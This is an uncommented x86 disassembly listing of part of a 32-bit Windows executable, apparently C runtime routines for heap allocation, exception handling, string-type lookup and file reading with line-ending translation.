  404665:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  40466c:	dec    BYTE PTR [ecx]
  40466e:	jne    0x404676
  404670:	mov    ecx,DWORD PTR [ebp+0x8]
  404673:	and    DWORD PTR [ecx+0x4],ebx
  404676:	mov    ebx,DWORD PTR [ebp+0xc]
  404679:	mov    ecx,DWORD PTR [edi+0x8]
  40467c:	mov    esi,DWORD PTR [edi+0x4]
  40467f:	mov    DWORD PTR [ecx+0x4],esi
  404682:	mov    esi,DWORD PTR [edi+0x8]
  404685:	mov    ecx,DWORD PTR [edi+0x4]
  404688:	mov    DWORD PTR [ecx+0x8],esi
  40468b:	mov    esi,DWORD PTR [ebp+0x10]
  40468e:	add    esi,DWORD PTR [ebp-0x4]
  404691:	mov    DWORD PTR [ebp+0x10],esi
  404694:	sar    esi,0x4
  404697:	dec    esi
  404698:	cmp    esi,0x3f
  40469b:	jbe    0x4046a0
  40469d:	push   0x3f
  40469f:	pop    esi
  4046a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4046a3:	lea    ecx,[ecx+esi*8]
  4046a6:	mov    edi,DWORD PTR [ecx+0x4]
  4046a9:	mov    DWORD PTR [ebx+0x8],ecx
  4046ac:	mov    DWORD PTR [ebx+0x4],edi
  4046af:	mov    DWORD PTR [ecx+0x4],ebx
  4046b2:	mov    ecx,DWORD PTR [ebx+0x4]
  4046b5:	mov    DWORD PTR [ecx+0x8],ebx
  4046b8:	mov    ecx,DWORD PTR [ebx+0x4]
  4046bb:	cmp    ecx,DWORD PTR [ebx+0x8]
  4046be:	jne    0x404717
  4046c0:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4046c4:	mov    BYTE PTR [ebp+0xf],cl
  4046c7:	inc    cl
  4046c9:	cmp    esi,0x20
  4046cc:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4046d0:	jae    0x4046ee
  4046d2:	cmp    BYTE PTR [ebp+0xf],0x0
  4046d6:	jne    0x4046e6
  4046d8:	mov    ecx,esi
  4046da:	mov    edi,0x80000000
  4046df:	shr    edi,cl
  4046e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4046e4:	or     DWORD PTR [ecx],edi
  4046e6:	lea    eax,[eax+edx*4+0x44]
  4046ea:	mov    ecx,esi
  4046ec:	jmp    0x40470e
  4046ee:	cmp    BYTE PTR [ebp+0xf],0x0
  4046f2:	jne    0x404704
  4046f4:	lea    ecx,[esi-0x20]
  4046f7:	mov    edi,0x80000000
  4046fc:	shr    edi,cl
  4046fe:	mov    ecx,DWORD PTR [ebp+0x8]
  404701:	or     DWORD PTR [ecx+0x4],edi
  404704:	lea    eax,[eax+edx*4+0xc4]
  40470b:	lea    ecx,[esi-0x20]
  40470e:	mov    edx,0x80000000
  404713:	shr    edx,cl
  404715:	or     DWORD PTR [eax],edx
  404717:	mov    eax,DWORD PTR [ebp+0x10]
  40471a:	mov    DWORD PTR [ebx],eax
  40471c:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  404720:	xor    eax,eax
  404722:	inc    eax
  404723:	pop    edi
  404724:	pop    esi
  404725:	pop    ebx
  404726:	leave  
  404727:	ret    
  404728:	push   ebp
  404729:	mov    ebp,esp
  40472b:	sub    esp,0x14
  40472e:	mov    ecx,DWORD PTR [ebp+0x8]
  404731:	mov    eax,ds:0x4299a8
  404736:	mov    edx,DWORD PTR ds:0x4299ac
  40473c:	add    ecx,0x17
  40473f:	and    ecx,0xfffffff0
  404742:	push   ebx
  404743:	mov    DWORD PTR [ebp-0x10],ecx
  404746:	sar    ecx,0x4
  404749:	push   esi
  40474a:	lea    eax,[eax+eax*4]
  40474d:	push   edi
  40474e:	dec    ecx
  40474f:	cmp    ecx,0x20
  404752:	lea    edi,[edx+eax*4]
  404755:	mov    DWORD PTR [ebp-0x4],edi
  404758:	jge    0x404765
  40475a:	or     esi,0xffffffff
  40475d:	shr    esi,cl
  40475f:	or     DWORD PTR [ebp-0x8],0xffffffff
  404763:	jmp    0x404772
  404765:	add    ecx,0xffffffe0
  404768:	or     eax,0xffffffff
  40476b:	xor    esi,esi
  40476d:	shr    eax,cl
  40476f:	mov    DWORD PTR [ebp-0x8],eax
  404772:	mov    eax,ds:0x4299b4
  404777:	mov    ebx,eax
  404779:	mov    DWORD PTR [ebp-0xc],esi
  40477c:	cmp    ebx,edi
  40477e:	jmp    0x404794
  404780:	mov    ecx,DWORD PTR [ebx+0x4]
  404783:	mov    edi,DWORD PTR [ebx]
  404785:	and    ecx,DWORD PTR [ebp-0x8]
  404788:	and    edi,esi
  40478a:	or     ecx,edi
  40478c:	jne    0x404799
  40478e:	add    ebx,0x14
  404791:	cmp    ebx,DWORD PTR [ebp-0x4]
  404794:	mov    DWORD PTR [ebp+0x8],ebx
  404797:	jb     0x404780
  404799:	cmp    ebx,DWORD PTR [ebp-0x4]
  40479c:	jne    0x4047c2
  40479e:	mov    ebx,edx
  4047a0:	jmp    0x4047b3
  4047a2:	mov    ecx,DWORD PTR [ebx+0x4]
  4047a5:	mov    edi,DWORD PTR [ebx]
  4047a7:	and    ecx,DWORD PTR [ebp-0x8]
  4047aa:	and    edi,esi
  4047ac:	or     ecx,edi
  4047ae:	jne    0x4047ba
  4047b0:	add    ebx,0x14
  4047b3:	cmp    ebx,eax
  4047b5:	mov    DWORD PTR [ebp+0x8],ebx
  4047b8:	jb     0x4047a2
  4047ba:	cmp    ebx,eax
  4047bc:	je     0x404856
  4047c2:	mov    DWORD PTR ds:0x4299b4,ebx
  4047c8:	mov    eax,DWORD PTR [ebx+0x10]
  4047cb:	mov    edx,DWORD PTR [eax]
  4047cd:	cmp    edx,0xffffffff
  4047d0:	mov    DWORD PTR [ebp-0x4],edx
  4047d3:	je     0x4047e9
  4047d5:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4047dc:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4047e0:	and    ecx,DWORD PTR [ebp-0x8]
  4047e3:	and    edi,esi
  4047e5:	or     ecx,edi
  4047e7:	jne    0x40481f
  4047e9:	mov    edx,DWORD PTR [eax+0xc4]
  4047ef:	and    edx,DWORD PTR [ebp-0x8]
  4047f2:	and    DWORD PTR [ebp-0x4],0x0
  4047f6:	lea    ecx,[eax+0x44]
  4047f9:	mov    esi,DWORD PTR [ecx]
  4047fb:	and    esi,DWORD PTR [ebp-0xc]
  4047fe:	or     edx,esi
  404800:	mov    esi,DWORD PTR [ebp-0xc]
  404803:	jne    0x40481c
  404805:	mov    edx,DWORD PTR [ecx+0x84]
  40480b:	and    edx,DWORD PTR [ebp-0x8]
  40480e:	inc    DWORD PTR [ebp-0x4]
  404811:	add    ecx,0x4
  404814:	mov    edi,DWORD PTR [ecx]
  404816:	and    edi,esi
  404818:	or     edx,edi
  40481a:	je     0x404805
  40481c:	mov    edx,DWORD PTR [ebp-0x4]
  40481f:	mov    ecx,edx
  404821:	imul   ecx,ecx,0x204
  404827:	lea    ecx,[ecx+eax*1+0x144]
  40482e:	mov    DWORD PTR [ebp-0xc],ecx
  404831:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  404835:	xor    edi,edi
  404837:	and    ecx,esi
  404839:	jne    0x4048a8
  40483b:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  404842:	and    ecx,DWORD PTR [ebp-0x8]
  404845:	push   0x20
  404847:	pop    edi
  404848:	jmp    0x4048a8
  40484a:	cmp    DWORD PTR [ebx+0x8],0x0
  40484e:	jne    0x40485b
  404850:	add    ebx,0x14
  404853:	mov    DWORD PTR [ebp+0x8],ebx
  404856:	cmp    ebx,DWORD PTR [ebp-0x4]
  404859:	jb     0x40484a
  40485b:	cmp    ebx,DWORD PTR [ebp-0x4]
  40485e:	jne    0x404886
  404860:	mov    ebx,edx
  404862:	jmp    0x40486d
  404864:	cmp    DWORD PTR [ebx+0x8],0x0
  404868:	jne    0x404874
  40486a:	add    ebx,0x14
  40486d:	cmp    ebx,eax
  40486f:	mov    DWORD PTR [ebp+0x8],ebx
  404872:	jb     0x404864
  404874:	cmp    ebx,eax
  404876:	jne    0x404886
  404878:	call   0x40428c
  40487d:	mov    ebx,eax
  40487f:	test   ebx,ebx
  404881:	mov    DWORD PTR [ebp+0x8],ebx
  404884:	je     0x40489e
  404886:	push   ebx
  404887:	call   0x404343
  40488c:	pop    ecx
  40488d:	mov    ecx,DWORD PTR [ebx+0x10]
  404890:	mov    DWORD PTR [ecx],eax
  404892:	mov    eax,DWORD PTR [ebx+0x10]
  404895:	cmp    DWORD PTR [eax],0xffffffff
  404898:	jne    0x4047c2
  40489e:	xor    eax,eax
  4048a0:	jmp    0x404a1f
  4048a5:	shl    ecx,1
  4048a7:	inc    edi
  4048a8:	test   ecx,ecx
  4048aa:	jge    0x4048a5
  4048ac:	mov    ecx,DWORD PTR [ebp-0xc]
  4048af:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4048b3:	mov    ecx,DWORD PTR [edx]
  4048b5:	sub    ecx,DWORD PTR [ebp-0x10]
  4048b8:	mov    esi,ecx
  4048ba:	sar    esi,0x4
  4048bd:	dec    esi
  4048be:	cmp    esi,0x3f
  4048c1:	mov    DWORD PTR [ebp-0x8],ecx
  4048c4:	jle    0x4048c9
  4048c6:	push   0x3f
  4048c8:	pop    esi
  4048c9:	cmp    esi,edi
  4048cb:	je     0x4049d2
  4048d1:	mov    ecx,DWORD PTR [edx+0x4]
  4048d4:	cmp    ecx,DWORD PTR [edx+0x8]
  4048d7:	jne    0x404935
  4048d9:	cmp    edi,0x20
  4048dc:	mov    ebx,0x80000000
  4048e1:	jge    0x404909
  4048e3:	mov    ecx,edi
  4048e5:	shr    ebx,cl
  4048e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4048ea:	lea    edi,[eax+edi*1+0x4]
  4048ee:	not    ebx
  4048f0:	mov    DWORD PTR [ebp-0x14],ebx
  4048f3:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4048f7:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4048fb:	dec    BYTE PTR [edi]
  4048fd:	jne    0x404932
  4048ff:	mov    ecx,DWORD PTR [ebp-0x14]
  404902:	mov    ebx,DWORD PTR [ebp+0x8]
  404905:	and    DWORD PTR [ebx],ecx
  404907:	jmp    0x404935
  404909:	lea    ecx,[edi-0x20]
  40490c:	shr    ebx,cl
  40490e:	mov    ecx,DWORD PTR [ebp-0x4]
  404911:	lea    ecx,[eax+ecx*4+0xc4]
  404918:	lea    edi,[eax+edi*1+0x4]
  40491c:	not    ebx
  40491e:	and    DWORD PTR [ecx],ebx
  404920:	dec    BYTE PTR [edi]
  404922:	mov    DWORD PTR [ebp-0x14],ebx
  404925:	jne    0x404932
  404927:	mov    ebx,DWORD PTR [ebp+0x8]
  40492a:	mov    ecx,DWORD PTR [ebp-0x14]
  40492d:	and    DWORD PTR [ebx+0x4],ecx
  404930:	jmp    0x404935
  404932:	mov    ebx,DWORD PTR [ebp+0x8]
  404935:	cmp    DWORD PTR [ebp-0x8],0x0
  404939:	mov    ecx,DWORD PTR [edx+0x8]
  40493c:	mov    edi,DWORD PTR [edx+0x4]
  40493f:	mov    DWORD PTR [ecx+0x4],edi
  404942:	mov    ecx,DWORD PTR [edx+0x4]
  404945:	mov    edi,DWORD PTR [edx+0x8]
  404948:	mov    DWORD PTR [ecx+0x8],edi
  40494b:	je     0x4049de
  404951:	mov    ecx,DWORD PTR [ebp-0xc]
  404954:	lea    ecx,[ecx+esi*8]
  404957:	mov    edi,DWORD PTR [ecx+0x4]
  40495a:	mov    DWORD PTR [edx+0x8],ecx
  40495d:	mov    DWORD PTR [edx+0x4],edi
  404960:	mov    DWORD PTR [ecx+0x4],edx
  404963:	mov    ecx,DWORD PTR [edx+0x4]
  404966:	mov    DWORD PTR [ecx+0x8],edx
  404969:	mov    ecx,DWORD PTR [edx+0x4]
  40496c:	cmp    ecx,DWORD PTR [edx+0x8]
  40496f:	jne    0x4049cf
  404971:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  404975:	mov    BYTE PTR [ebp+0xb],cl
  404978:	inc    cl
  40497a:	cmp    esi,0x20
  40497d:	mov    BYTE PTR [esi+eax*1+0x4],cl
  404981:	jge    0x4049a6
  404983:	cmp    BYTE PTR [ebp+0xb],0x0
  404987:	jne    0x404994
  404989:	mov    edi,0x80000000
  40498e:	mov    ecx,esi
  404990:	shr    edi,cl
  404992:	or     DWORD PTR [ebx],edi
  404994:	mov    ecx,esi
  404996:	mov    edi,0x80000000
  40499b:	shr    edi,cl
  40499d:	mov    ecx,DWORD PTR [ebp-0x4]
  4049a0:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4049a4:	jmp    0x4049cf
  4049a6:	cmp    BYTE PTR [ebp+0xb],0x0
  4049aa:	jne    0x4049b9
  4049ac:	lea    ecx,[esi-0x20]
  4049af:	mov    edi,0x80000000
  4049b4:	shr    edi,cl
  4049b6:	or     DWORD PTR [ebx+0x4],edi
  4049b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4049bc:	lea    edi,[eax+ecx*4+0xc4]
  4049c3:	lea    ecx,[esi-0x20]
  4049c6:	mov    esi,0x80000000
  4049cb:	shr    esi,cl
  4049cd:	or     DWORD PTR [edi],esi
  4049cf:	mov    ecx,DWORD PTR [ebp-0x8]
  4049d2:	test   ecx,ecx
  4049d4:	je     0x4049e1
  4049d6:	mov    DWORD PTR [edx],ecx
  4049d8:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4049dc:	jmp    0x4049e1
  4049de:	mov    ecx,DWORD PTR [ebp-0x8]
  4049e1:	mov    esi,DWORD PTR [ebp-0x10]
  4049e4:	add    edx,ecx
  4049e6:	lea    ecx,[esi+0x1]
  4049e9:	mov    DWORD PTR [edx],ecx
  4049eb:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4049ef:	mov    esi,DWORD PTR [ebp-0xc]
  4049f2:	mov    ecx,DWORD PTR [esi]
  4049f4:	test   ecx,ecx
  4049f6:	lea    edi,[ecx+0x1]
  4049f9:	mov    DWORD PTR [esi],edi
  4049fb:	jne    0x404a17
  4049fd:	cmp    ebx,DWORD PTR ds:0x4299a4
  404a03:	jne    0x404a17
  404a05:	mov    ecx,DWORD PTR [ebp-0x4]
  404a08:	cmp    ecx,DWORD PTR ds:0x4299bc
  404a0e:	jne    0x404a17
  404a10:	and    DWORD PTR ds:0x4299a4,0x0
  404a17:	mov    ecx,DWORD PTR [ebp-0x4]
  404a1a:	mov    DWORD PTR [eax],ecx
  404a1c:	lea    eax,[edx+0x4]
  404a1f:	pop    edi
  404a20:	pop    esi
  404a21:	pop    ebx
  404a22:	leave  
  404a23:	ret    
  404a24:	push   esi
  404a25:	inc    ebx
  404a26:	xor    dh,BYTE PTR [eax]
  404a28:	pop    eax
  404a29:	inc    ebx
  404a2a:	xor    BYTE PTR [eax],dh
  404a2c:	push   ebp
  404a2d:	mov    ebp,esp
  404a2f:	sub    esp,0x8
  404a32:	push   ebx
  404a33:	push   esi
  404a34:	push   edi
  404a35:	push   ebp
  404a36:	cld    
  404a37:	mov    ebx,DWORD PTR [ebp+0xc]
  404a3a:	mov    eax,DWORD PTR [ebp+0x8]
  404a3d:	test   DWORD PTR [eax+0x4],0x6
  404a44:	jne    0x404acc
  404a4a:	mov    DWORD PTR [ebp-0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x10]
  404a50:	mov    DWORD PTR [ebp-0x4],eax
  404a53:	lea    eax,[ebp-0x8]
  404a56:	mov    DWORD PTR [ebx-0x4],eax
  404a59:	mov    esi,DWORD PTR [ebx+0xc]
  404a5c:	mov    edi,DWORD PTR [ebx+0x8]
  404a5f:	cmp    esi,0xffffffff
  404a62:	je     0x404ac5
  404a64:	lea    ecx,[esi+esi*2]
  404a67:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  404a6c:	je     0x404ab3
  404a6e:	push   esi
  404a6f:	push   ebp
  404a70:	lea    ebp,[ebx+0x10]
  404a73:	call   DWORD PTR [edi+ecx*4+0x4]
  404a77:	pop    ebp
  404a78:	pop    esi
  404a79:	mov    ebx,DWORD PTR [ebp+0xc]
  404a7c:	or     eax,eax
  404a7e:	je     0x404ab3
  404a80:	js     0x404abe
  404a82:	mov    edi,DWORD PTR [ebx+0x8]
  404a85:	push   ebx
  404a86:	call   0x405940
  404a8b:	add    esp,0x4
  404a8e:	lea    ebp,[ebx+0x10]
  404a91:	push   esi
  404a92:	push   ebx
  404a93:	call   0x405982
  404a98:	add    esp,0x8
  404a9b:	lea    ecx,[esi+esi*2]
  404a9e:	push   0x1
  404aa0:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  404aa4:	call   0x405a16
  404aa9:	mov    eax,DWORD PTR [edi+ecx*4]
  404aac:	mov    DWORD PTR [ebx+0xc],eax
  404aaf:	call   DWORD PTR [edi+ecx*4+0x8]
  404ab3:	mov    edi,DWORD PTR [ebx+0x8]
  404ab6:	lea    ecx,[esi+esi*2]
  404ab9:	mov    esi,DWORD PTR [edi+ecx*4]
  404abc:	jmp    0x404a5f
  404abe:	mov    eax,0x0
  404ac3:	jmp    0x404ae1
  404ac5:	mov    eax,0x1
  404aca:	jmp    0x404ae1
  404acc:	push   ebp
  404acd:	lea    ebp,[ebx+0x10]
  404ad0:	push   0xffffffff
  404ad2:	push   ebx
  404ad3:	call   0x405982
  404ad8:	add    esp,0x8
  404adb:	pop    ebp
  404adc:	mov    eax,0x1
  404ae1:	pop    ebp
  404ae2:	pop    edi
  404ae3:	pop    esi
  404ae4:	pop    ebx
  404ae5:	mov    esp,ebp
  404ae7:	pop    ebp
  404ae8:	ret    
  404ae9:	push   ebp
  404aea:	mov    ecx,DWORD PTR [esp+0x8]
  404aee:	mov    ebp,DWORD PTR [ecx]
  404af0:	mov    eax,DWORD PTR [ecx+0x1c]
  404af3:	push   eax
  404af4:	mov    eax,DWORD PTR [ecx+0x18]
  404af7:	push   eax
  404af8:	call   0x405982
  404afd:	add    esp,0x8
  404b00:	pop    ebp
  404b01:	ret    0x4
  404b04:	push   0x1c
  404b06:	push   0x426980
  404b0b:	call   0x4030a4
  404b10:	xor    esi,esi
  404b12:	cmp    DWORD PTR ds:0x42894c,esi
  404b18:	jne    0x404b4f
  404b1a:	lea    eax,[ebp-0x1c]
  404b1d:	push   eax
  404b1e:	xor    edi,edi
  404b20:	inc    edi
  404b21:	push   edi
  404b22:	push   0x42697c
  404b27:	push   edi
  404b28:	call   DWORD PTR ds:0x4260c8
  404b2e:	test   eax,eax
  404b30:	je     0x404b3a
  404b32:	mov    DWORD PTR ds:0x42894c,edi
  404b38:	jmp    0x404b4f
  404b3a:	call   DWORD PTR ds:0x426018
  404b40:	cmp    eax,0x78
  404b43:	jne    0x404b4f
  404b45:	mov    DWORD PTR ds:0x42894c,0x2
  404b4f:	mov    eax,ds:0x42894c
  404b54:	cmp    eax,0x2
  404b57:	je     0x404c47
  404b5d:	cmp    eax,esi
  404b5f:	je     0x404c47
  404b65:	cmp    eax,0x1
  404b68:	jne    0x404c6d
  404b6e:	mov    DWORD PTR [ebp-0x20],esi
  404b71:	mov    DWORD PTR [ebp-0x24],esi
  404b74:	cmp    DWORD PTR [ebp+0x18],esi
  404b77:	jne    0x404b81
  404b79:	mov    eax,ds:0x428968
  404b7e:	mov    DWORD PTR [ebp+0x18],eax
  404b81:	push   esi
  404b82:	push   esi
  404b83:	push   DWORD PTR [ebp+0x10]
  404b86:	push   DWORD PTR [ebp+0xc]
  404b89:	xor    eax,eax
  404b8b:	cmp    DWORD PTR [ebp+0x20],esi
  404b8e:	setne  al
  404b91:	lea    eax,[eax*8+0x1]
  404b98:	push   eax
  404b99:	push   DWORD PTR [ebp+0x18]
  404b9c:	call   DWORD PTR ds:0x42609c
  404ba2:	mov    edi,eax
  404ba4:	mov    DWORD PTR [ebp-0x28],edi
  404ba7:	test   edi,edi
  404ba9:	je     0x404c6d
  404baf:	and    DWORD PTR [ebp-0x4],0x0
  404bb3:	lea    ebx,[edi+edi*1]
  404bb6:	mov    eax,ebx
  404bb8:	add    eax,0x3
  404bbb:	and    eax,0xfffffffc
  404bbe:	call   0x4030f0
  404bc3:	mov    DWORD PTR [ebp-0x18],esp
  404bc6:	mov    esi,esp
  404bc8:	mov    DWORD PTR [ebp-0x2c],esi
  404bcb:	push   ebx
  404bcc:	push   0x0
  404bce:	push   esi
  404bcf:	call   0x403420
  404bd4:	add    esp,0xc
  404bd7:	or     DWORD PTR [ebp-0x4],0xffffffff
  404bdb:	jmp    0x404bf2
  404bdd:	xor    eax,eax
  404bdf:	inc    eax
  404be0:	ret    
  404be1:	mov    esp,DWORD PTR [ebp-0x18]
  404be4:	call   0x403504
  404be9:	xor    esi,esi
  404beb:	or     DWORD PTR [ebp-0x4],0xffffffff
  404bef:	mov    edi,DWORD PTR [ebp-0x28]
  404bf2:	test   esi,esi
  404bf4:	jne    0x404c0d
  404bf6:	push   edi
  404bf7:	push   0x2
  404bf9:	call   0x405c46
  404bfe:	pop    ecx
  404bff:	pop    ecx
  404c00:	mov    esi,eax
  404c02:	test   esi,esi
  404c04:	je     0x404c6d
  404c06:	mov    DWORD PTR [ebp-0x24],0x1
  404c0d:	push   edi
  404c0e:	push   esi
  404c0f:	push   DWORD PTR [ebp+0x10]
  404c12:	push   DWORD PTR [ebp+0xc]
  404c15:	push   0x1
  404c17:	push   DWORD PTR [ebp+0x18]
  404c1a:	call   DWORD PTR ds:0x42609c
  404c20:	test   eax,eax
  404c22:	je     0x404c35
  404c24:	push   DWORD PTR [ebp+0x14]
  404c27:	push   eax
  404c28:	push   esi
  404c29:	push   DWORD PTR [ebp+0x8]
  404c2c:	call   DWORD PTR ds:0x4260c8
  404c32:	mov    DWORD PTR [ebp-0x20],eax
  404c35:	cmp    DWORD PTR [ebp-0x24],0x0
  404c39:	je     0x404c42
  404c3b:	push   esi
  404c3c:	call   0x40331e
  404c41:	pop    ecx
  404c42:	mov    eax,DWORD PTR [ebp-0x20]
  404c45:	jmp    0x404cb5
  404c47:	mov    ebx,DWORD PTR [ebp+0x1c]
  404c4a:	cmp    ebx,esi
  404c4c:	jne    0x404c54
  404c4e:	mov    ebx,DWORD PTR ds:0x428958
  404c54:	mov    edi,DWORD PTR [ebp+0x18]
  404c57:	test   edi,edi
  404c59:	jne    0x404c61
  404c5b:	mov    edi,DWORD PTR ds:0x428968
  404c61:	push   ebx
  404c62:	call   0x405a2e
  404c67:	pop    ecx
  404c68:	cmp    eax,0xffffffff
  404c6b:	jne    0x404c71
  404c6d:	xor    eax,eax
  404c6f:	jmp    0x404cb5
  404c71:	cmp    eax,edi
  404c73:	je     0x404c93
  404c75:	push   0x0
  404c77:	push   0x0
  404c79:	lea    ecx,[ebp+0x10]
  404c7c:	push   ecx
  404c7d:	push   DWORD PTR [ebp+0xc]
  404c80:	push   eax
  404c81:	push   edi
  404c82:	call   0x405a77
  404c87:	add    esp,0x18
  404c8a:	mov    esi,eax
  404c8c:	test   esi,esi
  404c8e:	je     0x404c6d
  404c90:	mov    DWORD PTR [ebp+0xc],esi
  404c93:	push   DWORD PTR [ebp+0x14]
  404c96:	push   DWORD PTR [ebp+0x10]
  404c99:	push   DWORD PTR [ebp+0xc]
  404c9c:	push   DWORD PTR [ebp+0x8]
  404c9f:	push   ebx
  404ca0:	call   DWORD PTR ds:0x4260c4
  404ca6:	mov    edi,eax
  404ca8:	test   esi,esi
  404caa:	je     0x404cb3
  404cac:	push   esi
  404cad:	call   0x40331e
  404cb2:	pop    ecx
  404cb3:	mov    eax,edi
  404cb5:	lea    esp,[ebp-0x38]
  404cb8:	call   0x4030df
  404cbd:	ret    
  404cbe:	push   ebp
  404cbf:	mov    ebp,esp
  404cc1:	sub    esp,0x10
  404cc4:	push   ebx
  404cc5:	push   esi
  404cc6:	mov    esi,DWORD PTR [ebp+0x8]
  404cc9:	cmp    esi,DWORD PTR ds:0x429c08
  404ccf:	push   edi
  404cd0:	jae    0x404e85
  404cd6:	mov    eax,esi
  404cd8:	sar    eax,0x5
  404cdb:	lea    ebx,[eax*4+0x429c20]
  404ce2:	mov    eax,DWORD PTR [ebx]
  404ce4:	and    esi,0x1f
  404ce7:	shl    esi,0x3
  404cea:	add    eax,esi
  404cec:	mov    dl,BYTE PTR [eax+0x4]
  404cef:	test   dl,0x1
  404cf2:	je     0x404e85
  404cf8:	and    DWORD PTR [ebp-0xc],0x0
  404cfc:	cmp    DWORD PTR [ebp+0x10],0x0
  404d00:	mov    edi,DWORD PTR [ebp+0xc]
  404d03:	mov    ecx,edi
  404d05:	je     0x404d64
  404d07:	test   dl,0x2
  404d0a:	jne    0x404d64
  404d0c:	test   dl,0x48
  404d0f:	je     0x404d2e
  404d11:	mov    al,BYTE PTR [eax+0x5]
  404d14:	cmp    al,0xa
  404d16:	je     0x404d2e
  404d18:	dec    DWORD PTR [ebp+0x10]
  404d1b:	mov    BYTE PTR [edi],al
  404d1d:	mov    eax,DWORD PTR [ebx]
  404d1f:	lea    ecx,[edi+0x1]
  404d22:	mov    DWORD PTR [ebp-0xc],0x1
  404d29:	mov    BYTE PTR [eax+esi*1+0x5],0xa
  404d2e:	push   0x0
  404d30:	lea    eax,[ebp-0x10]
  404d33:	push   eax
  404d34:	push   DWORD PTR [ebp+0x10]
  404d37:	mov    eax,DWORD PTR [ebx]
  404d39:	push   ecx
  404d3a:	push   DWORD PTR [eax+esi*1]
  404d3d:	call   DWORD PTR ds:0x42601c
  404d43:	test   eax,eax
  404d45:	jne    0x404d77
  404d47:	call   DWORD PTR ds:0x426018
  404d4d:	push   0x5
  404d4f:	pop    ecx
  404d50:	cmp    eax,ecx
  404d52:	jne    0x404d5f
  404d54:	mov    DWORD PTR ds:0x4287d0,ecx
  404d5a:	jmp    0x404e8c
  404d5f:	cmp    eax,0x6d
  404d62:	jne    0x404d6b
  404d64:	xor    eax,eax
  404d66:	jmp    0x404e99
  404d6b:	push   eax
  404d6c:	call   0x405d4d
  404d71:	pop    ecx
  404d72:	jmp    0x404e96
  404d77:	mov    eax,DWORD PTR [ebx]
  404d79:	mov    edx,DWORD PTR [ebp-0x10]
  404d7c:	add    DWORD PTR [ebp-0xc],edx
  404d7f:	lea    ecx,[eax+esi*1+0x4]
  404d83:	mov    al,BYTE PTR [ecx]
  404d85:	test   al,al
  404d87:	jns    0x404e80
  404d8d:	test   edx,edx
  404d8f:	je     0x404d9a
  404d91:	cmp    BYTE PTR [edi],0xa
  404d94:	jne    0x404d9a
  404d96:	or     al,0x4
  404d98:	jmp    0x404d9c
  404d9a:	and    al,0xfb
  404d9c:	mov    BYTE PTR [ecx],al
  404d9e:	mov    eax,DWORD PTR [ebp+0xc]
  404da1:	mov    ecx,DWORD PTR [ebp-0xc]
  404da4:	add    ecx,eax
  404da6:	cmp    eax,ecx
  404da8:	mov    DWORD PTR [ebp-0x8],eax
  404dab:	mov    DWORD PTR [ebp-0xc],ecx
  404dae:	jae    0x404e7a
  404db4:	mov    eax,DWORD PTR [ebp-0x8]
  404db7:	mov    al,BYTE PTR [eax]
  404db9:	cmp    al,0x1a
  404dbb:	je     0x404e6a
  404dc1:	cmp    al,0xd
  404dc3:	je     0x404dd0
  404dc5:	mov    BYTE PTR [edi],al
  404dc7:	inc    edi
  404dc8:	inc    DWORD PTR [ebp-0x8]
  404dcb:	jmp    0x404e5c
  404dd0:	dec    ecx
  404dd1:	cmp    DWORD PTR [ebp-0x8],ecx
  404dd4:	jae    0x404dea
  404dd6:	mov    eax,DWORD PTR [ebp-0x8]
  404dd9:	inc    eax
  404dda:	cmp    BYTE PTR [eax],0xa
  404ddd:	jne    0x404de5
  404ddf:	add    DWORD PTR [ebp-0x8],0x2
  404de3:	jmp    0x404e3e
  404de5:	mov    DWORD PTR [ebp-0x8],eax
  404de8:	jmp    0x404e58
  404dea:	inc    DWORD PTR [ebp-0x8]
  404ded:	push   0x0
  404def:	lea    eax,[ebp-0x10]
  404df2:	push   eax
  404df3:	push   0x1
  404df5:	lea    eax,[ebp-0x1]
  404df8:	push   eax
  404df9:	mov    eax,DWORD PTR [ebx]
  404dfb:	push   DWORD PTR [eax+esi*1]
  404dfe:	call   DWORD PTR ds:0x42601c
  404e04:	test   eax,eax
  404e06:	jne    0x404e12
  404e08:	call   DWORD PTR ds:0x426018
  404e0e:	test   eax,eax
  404e10:	jne    0x404e58
  404e12:	cmp    DWORD PTR [ebp-0x10],0x0
  404e16:	je     0x404e58
  404e18:	mov    eax,DWORD PTR [ebx]
  404e1a:	test   BYTE PTR [eax+esi*1+0x4],0x48
  404e1f:	je     0x404e33
  404e21:	mov    al,BYTE PTR [ebp-0x1]
  404e24:	cmp    al,0xa
  404e26:	je     0x404e3e
  404e28:	mov    BYTE PTR [edi],0xd
  404e2b:	mov    ecx,DWORD PTR [ebx]
  404e2d:	mov    BYTE PTR [ecx+esi*1+0x5],al
  404e31:	jmp    0x404e5b
  404e33:	cmp    edi,DWORD PTR [ebp+0xc]
  404e36:	jne    0x404e43
  404e38:	cmp    BYTE PTR [ebp-0x1],0xa
  404e3c:	jne    0x404e43
  404e3e:	mov    BYTE PTR [edi],0xa
  404e41:	jmp    0x404e5b
  404e43:	push   0x1
  404e45:	push   0xffffffff
  404e47:	push   DWORD PTR [ebp+0x8]
  404e4a:	call   0x405cc1
  404e4f:	add    esp,0xc
  404e52:	cmp    BYTE PTR [ebp-0x1],0xa
  404e56:	je     0x404e5c
  404e58:	mov    BYTE PTR [edi],0xd
  404e5b:	inc    edi
  404e5c:	mov    ecx,DWORD PTR [ebp-0xc]
  404e5f:	cmp    DWORD PTR [ebp-0x8],ecx
  404e62:	jb     0x404db4
  404e68:	jmp    0x404e7a
  404e6a:	mov    eax,DWORD PTR [ebx]
